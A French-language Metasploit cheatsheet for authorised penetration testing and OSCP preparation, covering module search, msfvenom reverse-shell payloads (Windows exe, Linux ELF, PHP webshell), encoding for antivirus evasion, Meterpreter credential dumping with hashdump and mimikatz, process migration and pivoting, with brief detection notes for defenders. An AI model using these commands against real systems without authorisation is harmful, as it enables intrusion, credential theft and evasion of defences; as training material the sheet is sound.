# Cheatsheet — Metasploit Framework

Framework d'exploitation modulaire : recherche de modules, configuration, payloads, post-exploitation via Meterpreter.

> ⚠️ **Cadre.** Uniquement sur labs et périmètres autorisés par écrit. Lire un module avant de le lancer (`info`) : comme tout exploit, il peut être intrusif ou provoquer un DoS. **À pratiquer aussi sans Metasploit** — l'OSCP en limite fortement l'usage, et un responsable pentest doit comprendre ce que l'outil automatise.

---

## 1. Démarrer

```bash
sudo msfdb init          # initialiser la base PostgreSQL (workspaces, hôtes, loot)
msfconsole               # lancer la console
msfconsole -q            # sans la bannière
```

Dans la console :
```
db_status                # vérifier la connexion à la base
workspace -a projet_x    # créer/isoler un espace de travail
workspace projet_x       # basculer dessus
help                     # aide générale
```

---

## 2. Les types de modules

| Type | Rôle |
| --- | --- |
| **exploit** | Exploite une vulnérabilité pour obtenir un accès |
| **payload** | Le code exécuté après exploitation (ex. Meterpreter) |
| **auxiliary** | Scan, fuzzing, énumération, brute-force (pas de payload) |
| **post** | Actions après compromission (collecte, pivot) |
| **encoder** | Encode le payload (évasion basique) |
| **nop** | Génère des instructions NOP |

---

## 3. Chercher et sélectionner

```
search type:exploit platform:windows smb
search cve:2021-41773
search eternalblue

use 0                     # sélectionner par n° de résultat
use exploit/windows/smb/ms17_010_eternalblue
info                      # LIRE le module avant tout : cibles, options, risque
back                      # sortir du module
```

Filtres `search` utiles : `type:`, `platform:`, `cve:`, `rank:excellent`, `name:`.

---

## 4. Configurer un module

```
show options              # options requises (Required = yes)
show targets              # cibles supportées
show payloads            # payloads compatibles avec cet exploit
show advanced            # options avancées

set RHOSTS 10.0.0.10      # cible(s)
set RPORT 445
set LHOST 10.0.0.5        # TON IP (reverse)
set LPORT 443
set payload windows/x64/meterpreter/reverse_tcp
setg LHOST 10.0.0.5       # setg = global, gardé entre modules
unset RHOSTS
```

| Option | Sens |
| --- | --- |
| `RHOSTS` / `RPORT` | Hôte(s) et port **distants** (la cible) |
| `LHOST` / `LPORT` | Hôte et port **locaux** (l'attaquant, pour un reverse) |
| `SRVHOST` | IP d'un serveur monté par le module |
| `SESSION` | Session existante (modules post) |

---

## 5. Lancer et gérer les sessions

```
check                     # tester si la cible est vulnérable (sans exploiter), si supporté
run    (ou exploit)       # lancer
exploit -j                # en tâche de fond (job)
exploit -z                # ne pas interagir tout de suite

sessions                  # lister les sessions
sessions -i 1             # interagir avec la session 1
background  (ou Ctrl-Z)   # renvoyer la session au fond
sessions -k 1             # tuer la session 1
jobs / kill <id>          # gérer les tâches de fond
```

---

## 6. Le handler seul (payload généré ailleurs)

Pour recevoir un shell d'un payload créé par msfvenom :

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.5
set LPORT 443
exploit -j
```

---

## 7. msfvenom — générer des payloads

```bash
# Lister
msfvenom -l payloads
msfvenom -l formats

# Windows exe, reverse Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f elf -o shell.elf

# Webshell PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f raw -o shell.php

# Encodé (évasion basique) + plusieurs itérations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o enc.exe
```

| Flag | Sens |
| --- | --- |
| `-p` | Payload |
| `-f` | Format de sortie (exe, elf, raw, py, war…) |
| `-o` | Fichier de sortie |
| `-e` | Encoder |
| `-i` | Nombre d'itérations d'encodage |
| `-b` | Octets à éviter (bad chars, ex. `\x00`) |
| `LHOST/LPORT` | Rappel vers l'attaquant |

> `staged` (`.../meterpreter/reverse_tcp`) vs `stageless` (`.../meterpreter_reverse_tcp`) : le stageless est autonome (plus gros, plus fiable si le canal coupe).

---

## 8. Meterpreter — commandes clés

**Système**
```
sysinfo · getuid · getpid · ps · shell · exit
```
**Fichiers**
```
pwd · ls · cd · cat · download <f> · upload <f> · search -f *.kdbx
```
**Privilèges / identité**
```
getprivs · getsystem       # tentative d'élévation SYSTEM
hashdump                    # empreintes SAM (droits requis)
load kiwi ; creds_all       # mimikatz intégré
migrate <pid>               # se déplacer vers un autre processus (stabilité/évasion)
```
**Réseau / pivot**
```
ipconfig · route · arp · portfwd add -l 3389 -p 3389 -r <ip_interne>
run autoroute -s 10.10.0.0/24     # router à travers la session (pivot)
```
**Post-exploitation**
```
run post/windows/gather/enum_logged_on_users
run post/multi/recon/local_exploit_suggester   # pistes d'élévation
```

---

## 9. Le pivot (résumé)

1. `run autoroute -s 10.10.0.0/24` — ajouter la route interne via la session.
2. `use auxiliary/server/socks_proxy` (ou `socks4a`) — monter un proxy SOCKS.
3. Configurer `proxychains` (`/etc/proxychains4.conf`) sur le port du proxy.
4. `proxychains nmap -sT -Pn 10.10.0.20` — atteindre le réseau interne.

---

## 10. Base de données & traçabilité

```
db_nmap -sV 10.0.0.0/24    # nmap dont les résultats vont en base
hosts · services · vulns   # consulter
loot · creds               # butin et identifiants collectés
notes                      # annotations
db_export -f xml sortie.xml
```

---

## 11. À savoir expliquer à l'oral

- **Différence exploit / payload / auxiliary / post** et un exemple de chacun.
- **Pourquoi `migrate`** : sortir d'un processus instable ou près d'être fermé, se fondre dans un processus légitime.
- **staged vs stageless** et quand l'un est plus fiable.
- **Pourquoi savoir faire sans Metasploit** : comprendre la vulnérabilité, contourner un EDR qui signe les payloads MSF connus, exigence OSCP.
- **Côté Blue** : les payloads MSF par défaut sont **très** signés (AV/EDR, encoders connus détectés). Le trafic Meterpreter et `psexec` laissent des traces (Sysmon 1/3, events 4688/7045).
